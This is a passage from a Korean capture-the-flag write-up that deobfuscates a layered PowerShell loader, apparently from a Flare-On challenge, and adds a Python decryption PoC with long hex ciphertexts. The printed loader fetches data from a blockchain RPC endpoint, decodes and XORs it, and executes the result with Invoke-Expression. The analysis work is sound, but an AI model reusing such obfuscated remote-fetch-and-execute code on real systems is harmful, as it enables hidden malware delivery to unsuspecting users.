7tudepWe2Y8DwcEOnK2Bodl3vUnfE2OeejHfv9ixXvDpXQuS3mlc2GbxqbjSewH17PpyLl2trNemmQOwEQuJeOP6G9VJIlM6yDXZxnvoGxSVAmTqHjLmN9TlIG/cliyglYchQLxXpbG8hU0ZlbdNOutqbPu38nE/D5erN+Tic7qoj+I3RdNawCFum2ZR8meauNwQDDOEzt2jCJX5qTodSICGTLZCRwkZ6lCZhhpUkLoaYHTqd7TLfouWOIy6Ry4i0tsw13sA1O1+CCBNxrN3NLm35fPf8KOTMk30tmZDCYyPcseZM6OUjOUPTtDMbY7peprFtmQE+jVyexfVO5TNP1NKAv5N4xMkZZCUGajtECVK81xiUFeoNrFXGL45lGluxuE/z+BMYW3KOruA8GhrjeznqGTFf9aV3YPYMfmVMBs627ojPq3VxhraYlAJpB90XEqKHJA1lid2qjAlF42aZVkO2jbdL2VHHe8byUfKJlahtxYL0qAd4ADiqDKi1kiItQxkeE6Epshebv3qT+5/MjHlF10mT0oBOjK17CcOtPcOtkivIlRVegzziwNi7xlPqjgaZr3SOl1lp3jxzCODNlloekyeLIxABpUQVcUP02O91ctGqmkSMeawadH5T13rJJASNOkVtzScokpX9JW+ZJSy5ycIJx+wpQOLHjtk060lXWiVpa4au123omWKolStJSS9VqN2hj2s1I4b2fw48Bg6ZJe6O2/ETMNjf8S3tH+ewjeA70z4JQ9KhvCmEchGw0/V3W9MXKi2/6lo1WRhKH1n9USSZbdvAJ5H93RrHVerGspqWvW0kHbzgZN/VjMLm2LIoiTfiyfhJt9fNI5uos/2X80pk0TMfKDx9mPD048D8dONOJLPuJ3l1yforbMatXPVeM59O+qVf0v' ) , [iO.compRESSION.CompREsSionMode]::dEcoMPrEss ) ) , [SyStEm.TEXt.EnCodINg]::asCII)).ReaDTOEND()
```

<br />

난독화된 문자열을 `base64 decoding`, `raw inflate`하면 난독화 해제가 가능하며, 다시금 파워쉘 명령을 얻을 수 있다.


<br />

## Powershell Deobfuscation

조금 복잡해보이지만, 간추리면 `~~~~~~| &( ([stRing]$VErboSEpRefeReNCe)[1,3]+'X'-joiN'')` 형태이다. `VErboSEpRefeReNCe`은 `powershell`에 기본적으로 정해져있는 변수로, `"SilentlyContinue"`를 나타낸다. 때문에 결과적으로 `~~~~~|iex`의 형태가 되므로, 앞 `~~~~~`만 powershell로 실행한다.

```js
(("{39}{64}{57}{45}{70}{59}{9}{66}{0}{31}{21}{50}{6}{56}{5}{22}{69}{71}{43}{60}{8}{35}{68}{44}{1}{19}{41}{30}{67}{38}{18}{7}{33}{54}{63}{34}{61}{24}{48}{4}{47}{3}{40}{51}{26}{42}{15}{37}{12}{10}{11}{52}{14}{23}{29}{53}{25}{16}{49}{55}{62}{36}{27}{28}{13}{17}{46}{20}{2}{65}{58}{32}"-f 'CSAKoY+K','xed','P dKoY+KoYohteM- doKoY+KoYhteMtseR-ekovnI(( eulaV- pser emaN- elbairaV-teS
)1aP}Iz70.2Iz7:Iz7cprnosjIzKoY+KoY7,1:Iz7diIz7,]KCOLB ,}Iz7bcf088c5x0Iz7:Iz7atadIz7,KoY+KoYIz7sserddaK6fIz7:Iz7otIz7KoY+KoY{[:Iz7smarapIz7,Iz7llac_hteIz7:Iz7d','aBmorFsKoY+KoYetybK6f(gnirtSteKoY+KoYG.8FTU::]gniKoY+KoYdocnE.txeKoY+KoYT.metsyS[( KoY+KoYeulaV- KoY+KoYiicsAtluser emaN-KoY+KoY elbairaV-teS
))2setybK6f(gniKoY+KoYrtS46esaBmorF::]trevnoC[( eulaV- 46esaBmorFsetyb ema','tamroF #  _K6f f- 1aP}2X:0{1aP    
{ tcejbO-hcaEroF sOI ii','KoY+KoYab tlKoY+KoYuKoY+KoYser eht trevnoC #
}
 ))]htgneL.setyByekK6f % iK6f[setyByekK6f roxb-','teS
)gnidocne IICSA gnimussa( gnirts','KoY+KoYV-','eT[( eulaV- 5setyb emaN- elbairaV-teS
)}
)61 ,)2 ,xednItratsK6f(gnirtsbuS.setyBxehK6f(etyBo','c[((EcALPER.)93]RAHc[]GnIRTS[,)94]RAHc[+79]RAHc[+08]RAHc[((EcALPER.)63]RAHc[]GnIRTS[,)57]RAHc[+45]RAHc[+201]RAHc[((EcALPER.)KoY
dnammocK6f noisserpxE-ekovnI
)Iz7galfZjWZjW:C f- 1aPgaKoY+KoYlfZjWZjW:C > gnirtStlKoY+KoYuserK6KoY+KoYf ohce c/ dm','N- ','elbai','yb ema',')tl','.rebmuNxehK6f(etyBoT::]trevnoC[  ','0setybK6f(gni','Y+KoYcejbO-hcaEroFKoY+KoY sOI )1','user.)ydob_K6f ydoB- Iz7nosj/noitacil','usne( setyb ot xeh KoY+KoYmorf trevnoC #
)Iz7Iz7 ,Iz7 Iz7 ecalper- setyBxehK6f(KoY+KoY eula','nItrats em','noKoY+KoYC- tniopdne_tentsetK6f irU- 1aPtsoP1a','eT.metsyS[( eulaV- gnirtStluser emaN-',' ]iK6f[5setybK6f( + setyBtluserK6f( eulaV- ','KoY+KoY  
)1 + xednKoY+KoYItratsK6f( eu','eS
)}
srettel esacrKoY+KoYeppu htiw xeh tigid-',' KoY+KoYtKo','ulaV','f( eulaV','- rebmuNxeh emaN- elbairaV-teS
xiferp 1aPx01aP eht evomeR KoY+KoY#

','laV- xednIdne KoY+KoYema','F sOI )1 ','oY::]gnidocnE.tx','eSKoY( G62,KoY.KoY ,KoYriGHTToLeftKoY) DF9%{X2j_ } )+G62 X2j(set-ITEM  KoYvArIAbLE:oFSKoY KoY KoY )G62) ',' setyBxeh em','etirW#
 )1aP 1aP KoY+KoYnioj- setyBxehK6f( eulaV- gnirtSxehKoY+KoY emaN- elbairaKoY+KoY','T::]trevnoC[    
)1 + xednItra','alper- pserK6','rtSteG.8FTU::]gnidocnE.txeT.metsyS[( eulaV- 1set','elbairaV-tKoY+KoYeS
)sretcarahc xeh fo sriap gnir','. ( X2jEnV:coMspec[4,26,25]-jOInKoYKoY)(G62X2j(set-iTem KoYVAriABle:OfSKoY  KoYKoY )G62 + ( [STrinG][REGEx]:','N- elbairaV-teS
sety','aN- elbairaV-teS    
{ tcejbO-hcaEro','- 2setyb emaN- eKoY+KoYlbairaV-teS
))',' eht mrofreP ','ne emaN- elbairKoY+KoYaV-teS    
)2 * _K6f( eulaV- ','-]2,11,3[EmAN.)KoY*rdm*KoY ElBAIrav((.DF9)421]RAHc[]GnIRTS[,KoYsOIKoY(EcALPER.)','ppaIz7 epyTtnet','csAtlKoY+KoYuserK6f( euKoY+KoYlaV- setyBxeh emaN- elbairaV-teS
))46es','owt sa etyb hcae ',' - 2 / htgneL.rebmuNxehK6f(..0( eulaV- 0setyb emaN- elbairaV-teS
)sretcarahc xeh fo sriap gnirusne(K',' elbairaV-','b ot 46esab morf trevnoC #

))881 ,46(gnirtsbuS.1setybK6f( e','raV-teS
 )}
)61 ,)2 ,xednItratsK6f(gnirtsbuS','N- elbairaV-teS    
)2 * _K6f( eulaV- xednItrats emaN- elbairaV-teS    
{','aN-','oY+KoY setyb ot xeh morf trevnoC #
)1aP1',' a ot kc','YNIoJ','aN- elbairaV-t','cALPER.)KoYaVIKoY,)09]RAHc[+601]RAHc[+78]RAH','#
))Iz742NOERALFIz7(setyBteG.IICSA::]gnidocnE.txeT[( eulaV- setyByek emaN- elbairaV-teKoY+KoYS
setyb ot yek eht trevnoC #
))3setybK6f(gnirtSteG.8FTU::]gnidocnE.tx','V-t','aP ,1aPx01aP ec',' elbairaV-teS
gnirtSxKoY+KoYehK6f tuKoY+KoYptuO-',':MATCHeS(G62)KoYKo','ohtemIz7{1aP( eulaV- ydob_ emaN- elbairaV-teS
)Iz7 Iz7( eulaV-KoY+KoY tniKoY+KoYopdne_tentset em','c1aP maKoY+KoYrgorp-sserpmoc-esu-- x- ratIzKoY+KoY7( eulaV-KoY+KoY dnammoc emaKoY+KoYN- elbairaV-teS

))setyBtluserK6f(gnirtSteGKoY+KoY.II','- 2 / htgneL.setyBxehK6f(..0( eulaV- 3setyb emaN- ','tsK6f( eulaV- xednId','setyBtluser emaN- ','43]RAHc[]GnIRTS[,)37]RAHc[+221]RAHc[+55]RAHc[((E','elbairaVKoY+KoY-teS    
{ )++iK6f ;htgneL.5setybK6f tl- iK6f ;)0( eulaV- i emaN- elbairaV-teS( rof
))(@( eulaV- setyBtluser emaN- KoY+KoYelbairaV-teS
noitarepo ROX')).REpLACE('DF9','|').REpLACE('KoY',[STrinG][cHaR]39).REpLACE(([cHaR]71+[cHaR]54+[cHaR]50),[STrinG][cHaR]34).REpLACE('X2j','$').REpLACE('aVI',[STrinG][cHaR]92) | &( ([stRing]$VErboSEpRefeReNCe)[1,3]+'X'-joiN'')
```

<br />

~~이쯤에서 문제가 조금 더럽다는 인상을 받았다.~~ `$EnV:coMspec`은 `cmd.exe`의 기본 경로를 나타내고, 보통 `C:\Windows\System32\cmd.exe`일테니 `( $EnV:coMspec[4,26,25]-jOIn'')` 또한 `iex`이다. 이번엔 `iex | ~~~~~`의 형태가 되었으므로, 뒷 `~~~~~`를 파워쉘로 실행한다.

```js
. ( $EnV:coMspec[4,26,25]-jOIn'')("$(set-iTem 'VAriABle:OfS'  '' )" + ( [STrinG][REGEx]::MATCHeS(")''NIoJ-]2,11,3[EmAN.)'*rdm*' ElBAIrav((.|)421]RAHc[]GnIRTS[,'sOI'(EcALPER.)43]RAHc[]GnIRTS[,)37]RAHc[+221]RAHc[+55]RAHc[((EcALPER.)'\',)09]RAHc[+601]RAHc[+78]RAHc[((EcALPER.)93]RAHc[]GnIRTS[,)94]RAHc[+79]RAHc[+08]RAHc[((EcALPER.)63]RAHc[]GnIRTS[,)57]RAHc[+45]RAHc[+201]RAHc[((EcALPER.)' dnammocK6f noisserpxE-ekovnI )Iz7galfZjWZjW:C f- 1aPga'+'lfZjWZjW:C > gnirtStl'+'userK6'+'f ohce c/ dmc1aP ma'+'rgorp-sserpmoc-esu-- x- ratIz'+'7( eulaV-'+' dnammoc ema'+'N- elbairaV-teS ))setyBtluserK6f(gnirtSteG'+'.IICSA'+'::]gnidocnE.txeT.metsyS[( eulaV- gnirtStluser emaN- elbairaV-teS )gnidocne IICSA gnimussa( gnirts a ot kc'+'ab tl'+'u'+'ser eht trevnoC # } ))]htgneL.setyByekK6f % iK6f[setyByekK6f roxb- ]iK6f[5setybK6f( + setyBtluserK6f( eulaV- setyBtluser emaN- elbairaV'+'-teS { )++iK6f ;htgneL.5setybK6f tl- iK6f ;)0( eulaV- i emaN- elbairaV-teS( rof ))(@( eulaV- setyBtluser emaN- '+'elbairaV-teS noitarepo ROX eht mrofreP # ))Iz742NOERALFIz7(setyBteG.IICSA::]gnidocnE.txeT[( eulaV- setyByek emaN- elbairaV-te'+'S setyb ot yek eht trevnoC # ))3setybK6f(gnirtSteG.8FTU::]gnidocnE.txeT[( eulaV- 5setyb emaN- elbairaV-teS )} )61 ,)2 ,xednItratsK6f(gnirtsbuS.setyBxehK6f(etyBoT::]trevnoC[ )1 + xednItratsK6f( eulaV- xednIdne emaN- elbair'+'aV-teS )2 * _K6f( eulaV- xednItrats emaN- elbairaV-teS { tcejbO-hcaEroF sOI )1 - 2 / htgneL.setyBxehK6f(..0( eulaV- 3setyb emaN- elbairaV-t'+'eS )sretcarahc xeh fo sriap gnirusne( setyb ot xeh '+'morf trevnoC # )Iz7Iz7 ,Iz7 Iz7 ecalper- setyBxehK6f('+' eula'+'V- setyBxeh emaN- elbairaV-teS gnirtSx'+'ehK6f tu'+'ptuO-etirW# )1aP 1aP '+'nioj- setyBxehK6f( eulaV- gnirtSxeh'+' emaN- elbaira'+'V-teS )} srettel esacr'+'eppu htiw xeh tigid-owt sa etyb hcae tamroF #  _K6f f- 1aP}2X:0{1aP { tcejbO-hcaEroF sOI iicsAtl'+'userK6f( eu'+'laV- setyBxeh emaN- elbairaV-teS ))46esaBmorFs'+'etybK6f(gnirtSte'+'G.8FTU::]gni'+'docnE.txe'+'T.metsyS[( '+'eulaV- '+'iicsAtluser emaN-'+' elbairaV-teS ))2setybK6f(gni'+'rtS46esaBmorF::]trevnoC[( eulaV- 46esaBmorFsetyb emaN- elbairaV-teS setyb ot 46esab morf trevnoC # ))881 ,46(gnirtsbuS.1setybK6f( eulaV- 2setyb emaN- e'+'lbairaV-teS ))0setybK6f(gnirtSteG.8FTU::]gnidocnE.txeT.metsyS[( eulaV- 1setyb emaN- elbairaV-teS )} )61 ,)2 ,xednItratsK6f(gnirtsbuS.rebmuNxehK6f(etyBoT::]trevnoC[  '+' )1 + xedn'+'ItratsK6f( eulaV- xednIdne '+'emaN- elbairaV-teS )2 * _K6f( eulaV- xednItrats emaN- elbairaV-teS { '+'t'+'cejbO-hcaEroF'+' sOI )1 - 2 / htgneL.rebmuNxehK6f(..0( eulaV- 0setyb emaN- elbairaV-teS )sretcarahc xeh fo sriap gnirusne('+' setyb ot xeh morf trevnoC # )1aP1aP ,1aPx01aP ecalper- pserK6f( eulaV- rebmuNxeh emaN- elbairaV-teS xiferp 1aPx01aP eht evomeR '+'# )tluser.)ydob_K6f ydoB- Iz7nosj/noitacilppaIz7 epyTtnetno'+'C- tniopdne_tentsetK6f irU- 1aPtsoP1aP d'+'ohteM- do'+'hteMtseR-ekovnI(( eulaV- pser emaN- elbairaV-teS )1aP}Iz70.2Iz7:Iz7cprnosjIz'+'7,1:Iz7diIz7,]KCOLB ,}Iz7bcf088c5x0Iz7:Iz7atadIz7,'+'Iz7sserddaK6fIz7:Iz7otIz7'+'{[:Iz7smarapIz7,Iz7llac_hteIz7:Iz7dohtemIz7{1aP( eulaV- ydob_ emaN- elbairaV-teS )Iz7 Iz7( eulaV-'+' tni'+'opdne_tentset emaN- elbairaV-teS'( ",'.' ,'riGHTToLeft') |%{$_ } )+" $(set-ITEM  'vArIAbLE:oFS' ' ' )")
```

<br />

뒷 부분이 ~~해독을 해보지 않아도 딱 봐도~~ `iex`다. 해당 부분을 지우고 한 번 더 실행한다.

```js
('Set-Variable -Name testnet_endpo'+'int '+'-Value (7zI 7zI) Set-Variable -Name _body -Value (Pa1{7zImethod7zI:7zIeth_call7zI,7zIparams7zI:[{'+'7zIto7zI:7zIf6Kaddress7zI'+',7zIdata7zI:7zI0x5c880fcb7zI}, BLOCK],7zIid7zI:1,7'+'zIjsonrpc7zI:7zI2.07zI}Pa1) Set-Variable -Name resp -Value ((Invoke-RestMeth'+'od -Metho'+'d Pa1PostPa1 -Uri f6Ktestnet_endpoint -C'+'ontentType 7zIapplication/json7zI -Body f6K_body).result) #'+' Remove the Pa10xPa1 prefix Set-Variable -Name hexNumber -Value (f6Kresp -replace Pa10xPa1, Pa1Pa1) # Convert from hex to bytes '+'(ensuring pairs of hex characters) Set-Variable -Name bytes0 -Value (0..(f6KhexNumber.Length / 2 - 1) IOs '+'ForEach-Objec'+'t'+' { Set-Variable -Name startIndex -Value (f6K_ * 2) Set-Variable -Name'+' endIndex -Value (f6KstartI'+'ndex + 1) '+'  [Convert]::ToByte(f6KhexNumber.Substring(f6KstartIndex, 2), 16) }) Set-Variable -Name bytes1 -Value ([System.Text.Encoding]::UTF8.GetString(f6Kbytes0)) Set-Variabl'+'e -Name bytes2 -Value (f6Kbytes1.Substring(64, 188)) # Convert from base64 to bytes Set-Variable -Name bytesFromBase64 -Value ([Convert]::FromBase64Str'+'ing(f6Kbytes2)) Set-Variable '+'-Name resultAscii'+' -Value'+' ([System.T'+'ext.Encod'+'ing]::UTF8.G'+'etString(f6Kbyte'+'sFromBase64)) Set-Variable -Name hexBytes -Val'+'ue (f6Kresu'+'ltAscii IOs ForEach-Object { Pa1{0:X2}Pa1 -f f6K_  # Format each byte as two-digit hex with uppe'+'rcase letters }) Set-V'+'ariable -Name '+'hexString -Value (f6KhexBytes -join'+' Pa1 Pa1) #Write-Outp'+'ut f6Khe'+'xString Set-Variable -Name hexBytes -V'+'alue '+'(f6KhexBytes -replace 7zI 7zI, 7zI7zI) # Convert from'+' hex to bytes (ensuring pairs of hex characters) Se'+'t-Variable -Name bytes3 -Value (0..(f6KhexBytes.Length / 2 - 1) IOs ForEach-Object { Set-Variable -Name startIndex -Value (f6K_ * 2) Set-Va'+'riable -Name endIndex -Value (f6KstartIndex + 1) [Convert]::ToByte(f6KhexBytes.Substring(f6KstartIndex, 2), 16) }) Set-Variable -Name bytes5 -Value ([Text.Encoding]::UTF8.GetString(f6Kbytes3)) # Convert the key to bytes S'+'et-Variable -Name keyBytes -Value ([Text.Encoding]::ASCII.GetBytes(7zIFLAREON247zI)) # Perform the XOR operation Set-Variable'+' -Name resultBytes -Value (@()) for (Set-Variable -Name i -Value (0); f6Ki -lt f6Kbytes5.Length; f6Ki++) { Set-'+'Variable -Name resultBytes -Value (f6KresultBytes + (f6Kbytes5[f6Ki] -bxor f6KkeyBytes[f6Ki % f6KkeyBytes.Length])) } # Convert the res'+'u'+'lt ba'+'ck to a string (assuming ASCII encoding) Set-Variable -Name resultString -Value ([System.Text.Encoding]::'+'ASCII.'+'GetString(f6KresultBytes)) Set-Variable -N'+'ame command '+'-Value (7'+'zItar -x --use-compress-progr'+'am Pa1cmd /c echo f'+'6Kresu'+'ltString > C:WjZWjZfl'+'agPa1 -f C:WjZWjZflag7zI) Invoke-Expression f6Kcommand ').REPLAcE(([cHAR]102+[cHAR]54+[cHAR]75),[STRInG][cHAR]36).REPLAcE(([cHAR]80+[cHAR]97+[cHAR]49),[STRInG][cHAR]39).REPLAcE(([cHAR]87+[cHAR]106+[cHAR]90),'\').REPLAcE(([cHAR]55+[cHAR]122+[cHAR]73),[STRInG][cHAR]34).REPLAcE('IOs',[STRInG][cHAR]124)|.((varIABlE '*mdr*').NAmE[3,11,2]-JoIN'')
```

<br />

드디어 모든 난독화 해제가 완료되었다. Method `0x5c880fcb`를 호출 후 받은 응답에서 `0x`를 제거하고 편집, base64 디코딩 및 XOR 연산 등을 하는 내용 등을 포함하고 있다.

```js
Set-Variable -Name testnet_endpoint -Value (" ") 
Set-Variable -Name _body -Value ('{"method":"eth_call","params":[{"to":"$address","data":"0x5c880fcb"}, BLOCK],"id":1,"jsonrpc":"2.0"}') 
Set-Variable -Name resp -Value ((Invoke-RestMethod -Method 'Post' -Uri $testnet_endpoint -ContentType "application/json" -Body $_body).result)
# Remove the '0x' prefix Set-Variable -Name hexNumber -Value ($resp -replace '0x', '') # Convert from hex to bytes (ensuring pairs of hex characters)
Set-Variable -Name bytes0 -Value (
  0..($hexNumber.Length / 2 - 1) | ForEach-Object { 
    Set-Variable -Name startIndex -Value ($_ * 2) 
    Set-Variable -Name endIndex -Value ($startIndex + 1)   
    [Convert]::ToByte($hexNumber.Substring($startIndex, 2), 16) 
    }
  ) 
Set-Variable -Name bytes1 -Value ([System.Text.Encoding]::UTF8.GetString($bytes0)) 
Set-Variable -Name bytes2 -Value ($bytes1.Substring(64, 188)) 
# Convert from base64 to bytes 
Set-Variable -Name bytesFromBase64 -Value ([Convert]::FromBase64String($bytes2)) 
Set-Variable -Name resultAscii -Value ([System.Text.Encoding]::UTF8.GetString($bytesFromBase64)) 
Set-Variable -Name hexBytes -Value ($resultAscii | ForEach-Object {
   '{0:X2}' -f $_  # Format each byte as two-digit hex with uppercase letters 
  }) 
Set-Variable -Name hexString -Value ($hexBytes -join ' ') 
#Write-Output $hexString Set-Variable -Name hexBytes -Value ($hexBytes -replace " ", "") 
# Convert from hex to bytes (ensuring pairs of hex characters) 
Set-Variable -Name bytes3 -Value (
  0..($hexBytes.Length / 2 - 1) | ForEach-Object { 
    Set-Variable -Name startIndex -Value ($_ * 2) 
    Set-Variable -Name endIndex -Value ($startIndex + 1) 
    [Convert]::ToByte($hexBytes.Substring($startIndex, 2), 16) 
  }
) 
Set-Variable -Name bytes5 -Value ([Text.Encoding]::UTF8.GetString($bytes3)) 
# Convert the key to bytes 
Set-Variable -Name keyBytes -Value ([Text.Encoding]::ASCII.GetBytes("FLAREON24")) 
# Perform the XOR operation 
Set-Variable -Name resultBytes -Value (@()) for (Set-Variable -Name i -Value (0); $i -lt $bytes5.Length; $i++) {
  Set-Variable -Name resultBytes -Value ($resultBytes + ($bytes5[$i] -bxor $keyBytes[$i % $keyBytes.Length])) } 
# Convert the result back to a string (assuming ASCII encoding) 
Set-Variable -Name resultString -Value ([System.Text.Encoding]::ASCII.GetString($resultBytes))
Set-Variable -Name command -Value ("tar -x --use-compress-program 'cmd /c echo $resultString > C:\\flag' -f C:\\flag") Invoke-Expression $command
```

<br />

## PoC

위 파워쉘 코드를 재현하는 PoC코드를 작성하면 된다. 메소드에 대한 input 값은 앞서 다루었듯 BSCScan에서 가져온다. 어느 block이 flag에 관한 것인지 알 수 없으므로 각 block의 input 값들에 대하여 전수조사를 실시한다. 만약 이것만으로 flag가 출력되지 않는다면 이 스마트 컨트랙트 또한 디컴파일하여 로직을 살펴볼 필요가 있다.

```python
import base64

def extract_ascii(split):
    ascii_chars = [chr(b) for b in split if 0x20 <= b <= 0x7E]
    return ''.join(ascii_chars)
    
def decrypt(cyphertexts):
    key=b'FLAREON24'
    for cipher in ciphertexts:
        try:
            byte_string = cipher.to_bytes((cipher.bit_length() + 7) // 8, 'big')
            byte_strings = byte_string.split(b'\x00')
            for split in byte_strings:
                if len(split) > 10:
                    b_encoded = extract_ascii(split)
                    break
            b_decoded = base64.b64decode(b_encoded)
            data_bytes = bytes.fromhex(b_decoded.decode().replace(" ", ""))
            xor_result = bytes([data_bytes[i] ^ key[i % len(key)] for i in range(len(data_bytes))])
            print(xor_result)
        except:
            continue
        
if __name__=='__main__':
    ciphertexts = [
        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000bc4e4445674d3245674e3245674e3249674d324d674e324d674d3251674e4745674e5441674e4755674e5755674e7a59674e4451674e5455674e6a63674d5445674e5441674e5755674e6a59674d5455674d3245674e5455674d3259674d5463674d324d674d3251674e5445674d5455674e6a45674e5455674e546b674e4445674e6d51674d7a6b674e4755674e4449674e6a4d674e6d49674e324d674e4445674d6a49674e6a55674e6a41674d4745674e6d4d674e6a55674e6a4d3d00000000,
        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000bd4d4467674e324d674d7a55674d4751674e7a59674d7a6b674e3251674e574d674e6d49674d4449674d574d674d544d674d546b674d5745674d6a59674e3249674e6d51674e6a41674d6d55674e3251674e7a51674d4751674e7a51674e324d674e3251674d4455674e6d49674e7a63674d6a49674d5755674d4455674d6a41674d6d51674e3251674e7a49674e5449674d6d45674d6d51674d7a4d674d7a63674e6a67674d6a41674d6a41674d574d674e5463674d6a6b674d6a453d3d000000,
        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000614d4759674e6d4d674d7a59674d3249674d7a59674d6a63674e6d55674e4459674e574d674d6d59674d3259674e6a45674d6a55674d6a51674d324d674e6d55674e4459674e574d674d6a4d674e6d4d674d6a63674d3255674d6a51674d6a673d3d00000000000000000000000000000000000000000000000000000000000000,
        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000404d5759674d6a6b674d7a55674e7a49674d6a67674d6a41674d324d674e5463674d5451674d6a67674d6a4d674d6a67674d6a45674d6a41674e6d55674e6d593d,
        0x916ed24b000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000844d4445674d6a4d674d6d55674d7a59674e6a55674d3249674d6a59674e5749674e5745674d6a45674e6d4d674d7a55674d3245674d6d4d674d324d674e6d55674e5749674e4463674e6a59674d6a4d674d6d59674e7a49674d7a45674d6a63674d6d49674d5449674e4441674d6a4d674d3259674d7a55674d324d674d6a41674d32493d00000000000000000000000000000000000000000000000000000000,
        0x916ed24b0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000133457334e5a63335246625335555a5868304c6d564f513039456157354858546f36645735705932396b5253356e5a58525464484a70626b636f57334e5a633352466253356a5430353252584a3058546f36526e4a7654574a68553055324e484e30556b6c755279676953586443553046485255466a643049775155644651557852516e5242527a68425a464643656b46485655466a6430466e5155564651574a52516e70425232744254464643564546485455465a55554a3151554d775156466e516a464252316c42576d6443624546495355464a51554a335155644651575242516d70425232644253554643593046484e4546455555464c51554e525156706e516d394252316c425a564643616b4644515546515555466e5155564251556c6e51553542515739425a464643656b4648613046695a304a7551554e4251565633516a5642534531425a454643624546484d4546506430464f5155467651575252516e704252327442596d6443626b464451554656643049315155684e51575242516d7842527a42425447644355304649565546695a3049775155647251574a52516d7842517a524255314643645546495555466155554a355155633451574e42516c524252315642593264434d6b46486130465a64304a735155684e515539335155354251573942593046434d5546485355466951554a775155644e51556c42516d70425233644257564643656b46495455464a51554a745155646e5156706e516a564252303142535546434e3046424d4546445a30466e51554e4251556c4251576442526e4e42556b4643633046486430465455554a305155684251574a33516e6c425346464253304642615546486330466155554a355155633051567052516e4e42524531425457644261554644613046595555464f5155467651556c42515764425130464253554643643046495655465a5a304a7a5155647251566c3351576442534531425a454643614546495555466855554a7151554e4251567052516a524253464642576c4643655546484e45464a51554a4b5155633051575242516c464253464642593264425a304646593046615555497751555a4251574e6e516e5a425230314255564643613046485555466a5a304a735155684e51574e335157394252577442596d64434d4546475155466b51554a3551554e4251574642516b3542527a6842576b46434d554648643046615555467a51554e4251574e33516a424253456c4259564643645546485930464a51554a335155684a51574a33516d70425254524257564643644546485655464c555545335155457751554e6e5157644251304642535546425a3046476330465351554a7a5155643351564e52516e524253454642596e6443655546495555464c515546705155647a51567052516e6c42527a5242576c4643633046455455464e5a30467051554e72515668525155354251573942535546425a3046445155464a51554a335155685651566c6e516e4e4252327442575864425a3046495455466b51554a6f5155685251574652516d704251304642576c46434e4546495555466155554a355155633051556c42516b7042527a52425a454643555546495555466a5a30466e5155563351574a33516d68425231464256454643634546485355466a5a304a6f5155684a5157565251573942534531425a45464365554648613046695a304a7551554e4251574a6e516d6842527a4242576c464263454645633046455555464c51554e4251556c42515764425130464256336443525546486430466951554a4b5155637751574e42516e5a4253456c425a454642623046445355466864304a735155684a51574a6e516d78425233644254586442655546445355464c55554a6b5155457751554e6e5157644251304642535546425a3046495155466b55554a705155643351574652516d704251304642593364434d4546485255466b51554a775155644e51556c42516d7842534764425a45464362454649535546695a30466e5155644a51574a33516e5a425233644253554643563046486130466a5a3049775155685651566c52516e4e42526b464259326443646b46495555466155554a715155685251557442516b7042527a52425a454643555546495555466a5a30466e5155643351574e42516b4a4252314642576b4643655546485655466a64304a3651554e3351556c42516c5a4252577442596d64434d4546475155466b51554a3551554e4251574652516a52425230564259576443644546496230464d5155466e5155685651574652516e5642534646425355464362554648643046555a304a735155686a51565642516e6c42527a68425a454643624546485455466b5155467a51554e4251574a33516a464253464642535546434d554648613046695a30497751554e4251574a42516e644252316c42596b4643554546486430466151554a525155684a51574a33516a424252315642575864434d454644613046506430464f5155467651575a52515535425157394253576443515546424d4546445a30464f5155467651564652516d74425231464254464643565546496130466a51554a7351554e4251557042516d314252326442576d64434e554648545546455555464c5155457751554e6e51577442527a52425a5764434d30464955554661643049795155645251556c4251546c425130464256336443625546485a3046615a3049315155644e5156685251545a425247394256454643646b46485255466151554a4e5155647251566c6e516e6c4252305642593264434e5546445a30464a5a30467251554e6e515574425157354254303142596c4643656b46504d45464d5a30467551554e7a51557033516d744252336442596b4642626b46446130464d5a304a505155553451574e6e516e524252555642596b464363454649623046535555467651555a7a51566c33516b6c4252305642565764435a4546445a30464f6430463351554e765155313351586842517a684254586442654546446130464c64304a695155644e51574642516d684253456c4257464642623046455255464e5555463451554e7251557433516d4a42525531425955464361454649535546595555467651555a7a5156466e516a564253464642576c46435a4546455155466c5155457a5155524a5155745251584a42526e4e425558644353554648525546565a304a6b51554e6e515531525158644252477442533364424d6b46455155464d55554579515552425155745251584a42526e4e425558644362304648525546565a304a6b51554e6e515535525154424251334e42545646424d4546446130464c5555466e51554d7751574e6e516d784253454642596b464361454648545546615555466e51555a7a51566c33516d394252305642565764435a4546445a30465864304a7051555a7251565a42516b5a42526a4242545546434e4546455655465a6430467751554e7a51566433516b52425257644257564643655546474d45464c51554a695155644a51566452516c56425256564257464642643046495a30464f6430463351554e7251557433516d4a425255314259554643516b46475355465955554676515552465155316e5158704251334e4254576442644546455355464c5555467951555a7a51564633516b6c4252305642593264435a4546445a30465864304a705155687251575242516d7842526a4242545546434e454645555546615155467751554e7a51566433516b52425232644255564643553046474d45464c51554a695155644a51566452516c56425256564257464642643046495a30464f5a304a7351554e7251557433516d4a42523031425955464361454649535546595555467651555a7a51566c6e516a5642526c4642556c46435a4546455155466c5155457a51556452515574525158424251306c4253314642546b46426230464b51554a315155647651575652516a4e4252324e42596e64425a3046454d45464a51554a695155645a51574642516d314253477442575864435a454645623046505a304a495155645651575242516c464253456c42596e6443616b46465255466151554a725155684a51567052516e70425345314253304642613046484e45466c5a30497a5155685251567033516a4a4252314642544546425a3046445355464b5155467651554e6e5155703352454a42527a424259336445633046475455465a6430467551554e7a5155703352477442527a5242555764434d554648575546615a30467551554e7a51557033516d784253456c42536e6442634546444e4546555a304a515155684a51574a52516b4a4252586442553146434e6b46465655464c51554a695155564e51564e42516d6842526b6c4257464642623046476330465a5a304a6151555a5251564a52516d5242524546425a5546424d4546455755464c5555467951555a7a51564633516d394252305642593264435a4546445a30465864304a7051555a7251565a42516d7842526a4242545546434e454645575546615a30467751554e7a51566433516d70425257644255564643655546474d45464c51554a695155644a51566452516c56425256564257464642643046495a30464f6430463551554e7251557433516d4a4252553142553046436145464953554659555546765155524651553142515456425132744253336443596b46485455465451554a6f51555a4a5156685251573942526e4e42555764434e5546475555466155554a6b5155524251575642515442425246464253314642634546445155464d55554a355155645651574e42516e4e425230564257586443624546445155465864304a715155646e5156465251